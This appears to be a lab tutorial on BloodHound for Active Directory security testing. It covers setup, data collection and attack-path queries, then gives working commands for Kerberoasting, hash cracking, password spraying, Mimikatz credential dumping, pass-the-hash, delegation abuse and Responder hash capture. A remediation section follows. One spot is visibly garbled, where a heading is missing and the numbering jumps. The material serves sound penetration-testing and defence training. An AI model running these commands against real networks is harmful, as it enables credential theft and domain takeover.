### **What BloodHound Can Do**
BloodHound visualizes complex AD relationships in a graph database (using Neo4j) to highlight potential attack paths. Its key capabilities include:

1. **Mapping AD Relationships**:
   - Identifies users, groups, computers, and their permissions (e.g., who has admin rights, who can reset passwords).
   - Maps trust relationships, group memberships, and Kerberos delegations.
   - Reveals paths from low-privilege users to high-value targets (e.g., Domain Admins).

2. **Identifying Misconfigurations**:
   - Detects common AD vulnerabilities like unconstrained delegation, weak permissions, or excessive group memberships.
   - Highlights Kerberoastable accounts (users with Service Principal Names, SPNs).
   - Finds accounts with weak or no password policies.

3. **Attack Path Analysis**:
   - Shows the shortest path to compromise privileged accounts or systems.
   - Identifies lateral movement opportunities (e.g., via admin rights on specific computers).
   - Visualizes complex attack chains, such as abusing group memberships or session hijacking.

4. **Privilege Escalation Detection**:
   - Detects users with excessive privileges (e.g., non-admins with control over sensitive objects).
   - Identifies paths to escalate from a compromised user to Domain Admin.

5. **Custom Queries**:
   - Allows advanced users to write custom Cypher queries in Neo4j to analyze specific AD relationships.
   - Examples include finding all users with admin rights or identifying computers with unconstrained delegation.

6. **Session Tracking**:
   - Tracks active sessions on systems, revealing where privileged users are logged in for potential session hijacking.

7. **Kerberos Attack Insights**:
   - Highlights accounts vulnerable to Kerberoasting or ASREPRoast attacks.
   - Identifies misconfigured Kerberos delegations (unconstrained, constrained, or resource-based).

### **Best Use Cases for BloodHound**
BloodHound is versatile and can be used in various scenarios:

1. **Penetration Testing**:
   - Simulate real-world attacks to identify how an attacker could escalate privileges or move laterally.
   - Example: Map paths from a compromised low-privilege user to Domain Admin.

2. **Security Auditing**:
   - Audit AD environments for misconfigurations, excessive permissions, or weak policies.
   - Example: Identify all users with admin rights on critical servers.

3. **Red Team Engagements**:
   - Plan and execute complex attack chains, such as Kerberoasting or delegation abuse.
   - Example: Find a path to compromise a Domain Controller via a misconfigured service account.

4. **Blue Team Defense**:
   - Proactively identify and fix AD vulnerabilities before they’re exploited.
   - Example: Remove unnecessary users from privileged groups or disable unconstrained delegation.

5. **Incident Response**:
   - Analyze how an attacker may have gained access by mapping their potential attack path.
   - Example: Trace a breach from a compromised workstation to a Domain Admin account.

6. **Training and Education**:
   - Teach AD security concepts by visualizing real-world attack paths in a lab environment.
   - Example: Demonstrate how weak permissions lead to privilege escalation.

### **Security Testing Steps with BloodHound**
Below is a detailed, step-by-step guide to using BloodHound in an AD security testing scenario, assuming the provided setup (Windows Server 2019 AD, Kali Linux, Neo4j, etc.) is in place.

#### **Step 1: Install and Configure BloodHound**
1. **Install Dependencies on Kali Linux**:
   - Install required tools:
     ```bash
     sudo apt install bloodhound crackmapexec impacket-scripts responder
     ```
   - Install Neo4j (required for BloodHound’s graph database):
     ```bash
     sudo apt-get install apt-transport-https
     sudo apt-get install neo4j
     ```

2. **Configure Neo4j**:
   - Stop the Neo4j service to make configuration changes:
     ```bash
     sudo systemctl stop neo4j
     ```
   - Edit `/etc/neo4j/neo4j.conf` to allow remote connections (optional for external access):
     ```bash
     sudo nano /etc/neo4j/neo4j.conf
     ```
     - Uncomment and set:
       ```
       dbms.default_listen_address=0.0.0.0
       ```
   - Start Neo4j in console mode to verify:
     ```bash
     cd /usr/bin
     sudo ./neo4j console
     ```
   - Alternatively, start Neo4j as a service:
     ```bash
     sudo systemctl start neo4j
     ```
   - Access Neo4j’s web interface at `http://localhost:7474` and set the default credentials (usually `neo4j:neo4j`, then change the password).

3. **Launch BloodHound**:
   - Run BloodHound with the `--no-sandbox` flag to avoid permission issues:
     ```bash
     ./BloodHound --no-sandbox
     ```
   - Log in to BloodHound using the Neo4j credentials (set in the previous step).

#### **Step 2: Collect AD Data**
BloodHound requires data about the AD environment, collected using tools like **SharpHound** (Windows) or **BloodHound-Python** (Linux).

1. **Using BloodHound-Python (Kali Linux)**:
   - Install the Python collector:
     ```bash
     pip3 install bloodhound
     ```
   - Collect AD data with valid credentials (e.g., `testuser1:password123`):
     ```bash
     bloodhound-python -u testuser1 -p password123 -d lab.local -c All -dc dc01.lab.local
     ```
     - `-c All`: Collects all data (users, groups, sessions, ACLs, etc.).
     - Output: JSON files (e.g., `users.json`, `groups.json`) in the current directory.

2. **Using SharpHound (Windows Client)**:
   - Download SharpHound from the [BloodHound GitHub](https://github.com/BloodHoundAD/SharpHound).
   - Run SharpHound on a domain-joined Windows client:
     ```powershell
     .\SharpHound.exe -c All --zipfilename lab_data.zip
     ```
   - Transfer the generated `.zip` file to the Kali VM.

3. **Import Data into BloodHound**:
   - In the BloodHound GUI, click **Upload Data** and select the JSON or ZIP files generated by BloodHound-Python or SharpHound.
   - Wait for the data to process (this may take a few minutes for large environments).

#### **Step 3: Analyze Attack Paths**
Once data is imported, use BloodHound’s interface to analyze the AD environment:

1. **Pre-Built Queries**:
   - BloodHound provides built-in queries under the **Queries** tab, such as:
     - **Shortest Paths to Domain Admins**: Shows how a compromised user can reach Domain Admin privileges.
     - **Kerberoastable Users**: Lists accounts with SPNs vulnerable to Kerberoasting.
     - **Unconstrained Delegation**: Identifies systems with risky Kerberos delegation settings.
   - Example: Run **Shortest Paths to Domain Admins** to visualize escalation paths.

2. **Custom Queries**:
   - Use Neo4j’s Cypher language for advanced analysis. Example query to find users with admin rights:
     ```cypher
     MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
     ```
   - Save custom queries for reuse in future assessments.

3. **Visualize Attack Paths**:
   - BloodHound displays a graph with nodes (users, computers, groups) and edges (relationships like `MemberOf`, `HasSession`, `AdminTo`).
   - Click nodes to view details (e.g., user properties, group memberships).
   - Follow paths to identify vulnerabilities, such as a low-privilege user with a session on a Domain Controller.

#### **Step 4: Exploit Identified Vulnerabilities**
Use BloodHound’s findings to guide exploitation. Below are examples tied to the provided commands:

1. **Kerberoasting**:
   - BloodHound identifies Kerberoastable accounts (users with SPNs). Extract their hashes:
     ```bash
     impacket-GetUserSPNs -dc-ip 192.168.10.10 lab.local/testuser1:password123 -request
     ```
   - Crack the hashes using Hashcat:
     ```bash
     hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
     ```
   - Use cracked credentials for further attacks (e.g., privilege escalation).

2. **Password Spraying**:
   - If BloodHound shows weak password policies, use CrackMapExec for password spraying:
     ```bash
     crackmapexec smb 192.168.10.10 -u users.txt -p passwords.txt
     ```
   - Create `users.txt` from BloodHound’s user list and test common passwords.

3. **Privilege Escalation via Sessions**:
   - If BloodHound shows a privileged user session on a computer, use **Mimikatz** to dump credentials:
     ```powershell
     Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
     ```
   - Alternatively, use CrackMapExec with a stolen NTLM hash:
     ```bash
     crackmapexec smb 192.168.10.10 -u testuser1 -H <NTLM_hash>
     ```

4. **Abusing Delegations**:
   - For unconstrained delegation systems identified by BloodHound, request a Service Ticket:
     ```bash
     impacket-getST -spn cifs/dc01.lab.local -dc-ip 192.168.10.10 lab.local/svc-app:password123
     ```
   - Use the ticket for lateral movement or privilege escalation.

5. **Enumerate Shares**:
   - BloodHound may reveal systems with open shares. Verify with CrackMapExec:
     ```bash
     crackmapexec smb 192.168.10.10 -u testuser1 -p password123 --shares
     ```
   - Check for sensitive data in shares (e.g., the `C:\Sensitive` folder from the setup).

#### **Step 5: Document and Report**
- Use BloodHound’s **Export Graph** feature to save attack path visualizations.
- Document findings in a tool like **CherryTree** or a markdown file, including:
  - Misconfigurations (e.g., weak passwords, unconstrained delegation).
  - Attack paths (e.g., user-to-Domain-Admin escalation).
  - Successful exploits (e.g., cracked Kerberos hashes).
- Provide remediation steps (e.g., disable delegation, enforce strong passwords).

### **Best Practices for Using BloodHound**
1. **Use Valid Credentials**:
   - BloodHound requires valid AD credentials to collect meaningful data. Use compromised credentials or test accounts (e.g., `testuser1:password123`).

2. **Collect Comprehensive Data**:
   - Use the `-c All` flag with BloodHound-Python or SharpHound to gather all object types (users, groups, computers, ACLs, sessions).

3. **Update Regularly**:
   - Run collectors periodically to capture changes in the AD environment (e.g., new users, modified permissions).

4. **Filter Noise**:
   - Large AD environments generate complex graphs. Use BloodHound’s filters (e.g., exclude disabled accounts) to focus on high-value paths.

5. **Combine with Other Tools**:
   - Use BloodHound alongside tools like CrackMapExec, Impacket, and Responder for a complete attack simulation.
   - Example: Use Responder to capture NTLM hashes, then use BloodHound to map their impact.

6. **Secure the Tool**:
   - BloodHound data files (JSON/ZIP) contain sensitive AD information. Store them securely and delete after use.
   - Restrict Neo4j access by binding to `localhost` or using strong credentials.

7. **Test in a Lab First**:
   - Practice in a controlled environment (like the provided VirtualBox setup) before using BloodHound in production.

### **Additional Security Testing Techniques**
To complement BloodHound, incorporate these techniques (some referenced in the provided markdown):

1. **LDAP Enumeration**:
   - Use `ldapsearch` to gather user and group details:
     ```bash
     ldapsearch -x -H ldap://192.168.10.10 -b "dc=lab,dc=local" -s sub "(objectClass=user)" sAMAccountName
     ```
   - Combine with BloodHound to verify findings.

2. **ASREPRoast**:
   - Identify accounts not requiring Kerberos pre-authentication:
     ```bash
     impacket-GetNPUsers lab.local/ -dc-ip 192.168.10.10 -request -no-pass -usersfile users.txt
     ```
   - Crack hashes with Hashcat (module `-m 18200`).

3. **Group Policy Analysis**:
   - Check for weak GPO settings that BloodHound might miss:
     ```powershell
     Get-GPO -All | Get-GPOReport -ReportType Xml
     ```
   - Look for misconfigured scripts or permissions.

4. **Responder for Credential Harvesting**:
   - Capture NTLM hashes in the lab network:
     ```bash
     sudo responder -I eth0
     ```
   - Use captured hashes with CrackMapExec or BloodHound to map their impact.

5. **Exploit Unpatched Vulnerabilities**:
   - Test for vulnerabilities like PrintNightmare (if the system is unpatched):
     ```bash
     impacket-rpcdump 192.168.10.10 | grep MS-RPRN
     ```

   - Use BloodHound to identify accounts with weak or default passwords.

2. **Remove Excessive Permissions**:
   - Audit group memberships and remove users from privileged groups (e.g., Domain Admins).
   - BloodHound’s **GenericAll** or **WriteDacl** edges highlight risky permissions.

3. **Disable Unnecessary Delegations**:
   - Disable unconstrained delegation on all systems unless required.
   - Use constrained delegation where possible.

4. **Patch Systems**:
   - Apply Windows Updates to fix vulnerabilities like PrintNightmare or EternalBlue.

5. **Monitor and Audit**:
   - Enable detailed AD auditing (e.g., logon events, permission changes).
   - Use BloodHound periodically to verify fixes.

6. **Secure Shares**:
   - Remove `Everyone` permissions from shares (e.g., `C:\Sensitive`).
   - BloodHound’s session data can help identify systems with open shares.

### **Troubleshooting Common BloodHound Issues**
1. **Neo4j Fails to Start**:
   - Check logs: `/var/log/neo4j/neo4j.log`.
   - Ensure port 7474 is free: `sudo netstat -tuln | grep 7474`.
   - Reinstall Neo4j if needed: `sudo apt-get install --reinstall neo4j`.

2. **BloodHound GUI Crashes**:
   - Run with `--no-sandbox` or update Electron dependencies.
   - Verify Neo4j is running and credentials are correct.

3. **Data Collection Fails**:
   - Ensure credentials are valid and have sufficient permissions.
   - Check network connectivity to the Domain Controller (`ping 192.168.10.10`).
   - Use `-v` with BloodHound-Python for verbose output: `bloodhound-python -v -u testuser1 ...`.

4. **Large Graphs Are Unreadable**:
   - Filter out disabled accounts or low-value nodes in BloodHound.
   - Focus on specific queries (e.g., **High Value Targets**).
